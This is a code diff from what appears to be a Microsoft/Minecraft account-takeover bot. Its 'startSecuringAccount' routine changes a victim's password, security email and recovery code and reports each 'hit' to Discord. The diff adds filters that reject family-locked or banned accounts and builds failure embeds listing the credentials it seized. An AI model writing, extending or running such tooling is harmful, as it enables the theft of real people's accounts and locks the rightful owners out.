@@ -1,8 +1,10 @@
 from securing.utils.cookies.get_livedata import livedata
-from securing.build_embeds import add_credential_line_field, build_account_embeds
+from securing.build_embeds import add_credential_line_field, build_account_embeds, build_failure_embed
 from securing.auth.polish_host import polish_host
 from securing.auth.get_msaauth import get_msaauth
 from securing.utils.secure import secure
+from securing.account_filters import rejection_reason
+from securing.ban_checks import apply_ban_checks
 
 from database.database import DBConnection
 from discord import Embed
@@ -10,6 +12,31 @@ import httpx
 import uuid
 import time
 import logging
+
+
+def _reject_failure(email: str, reason: str, account: dict, *, credentials_changed: bool) -> dict:
+    ms = (account or {}).get("microsoft") or {}
+    out = {
+        "failed": True,
+        "reason": reason,
+        "microsoft": ms,
+        "minecraft": (account or {}).get("minecraft") or {},
+        "credentials_changed": credentials_changed,
+        "hit_embed": build_failure_embed(
+            email,
+            {
+                "security_email": ms.get("security_email") or "Couldn't Change!",
+                "password": ms.get("password") or "Couldn't Change!",
+                "recovery_code": ms.get("recovery_code") or "Couldn't Change!",
+                "username": ((account or {}).get("minecraft") or {}).get("name"),
+            },
+            reason,
+            error=reason,
+            credentials_changed=credentials_changed,
+        ),
+    }
+    return out
+
 
 async def startSecuringAccount(session: httpx.AsyncClient, email, device = None, code = None, recovery = True, ppft = None, rextra= None, command = False):
     # Handles the data to be displayed in embeds to discord
@@ -73,9 +100,10 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
         
         case "Family":
             print(f"[X] - Account is Family Locked")
-            account["minecraft"]["name"] = "Child Locked"
-            account["microsoft"]["email"] = "Child Locked"
-            account["microsoft"]["security_email"] = "Child Locked"
+            return {
+                "failed": True,
+                "reason": "Account is Family Locked (child/parental).",
+            }
             
         case _:
             print(f"[+] - Got MSAAUTH")
@@ -101,6 +129,27 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
                 account.setdefault("microsoft", {})
                 # Fall through to persist + embed with partial data
                 pass
+
+    creds_changed = bool(rextra) or (
+        str((account.get("microsoft") or {}).get("password") or "")
+        not in ("", "Couldn't Change!", "Unknown")
+        and "UNVERIFIED" not in str((account.get("microsoft") or {}).get("password") or "")
+    )
+    # After recover/secure, password is almost always changed when rextra is present
+    if rextra:
+        creds_changed = True
+
+    reject = rejection_reason(account)
+    if reject:
+        print(f"[X] - Rejected account: {reject}")
+        logging.warning("Rejected secured account %s: %s", email, reject)
+        return _reject_failure(email, reject, account, credentials_changed=creds_changed)
+
+    ban_reject = await apply_ban_checks(account)
+    if ban_reject:
+        print(f"[X] - Banned account: {ban_reject}")
+        logging.warning("Ban-check rejected %s: %s", email, ban_reject)
+        return _reject_failure(email, ban_reject, account, credentials_changed=creds_changed)
 
     finalTime = (time.time() - initialTime)
 
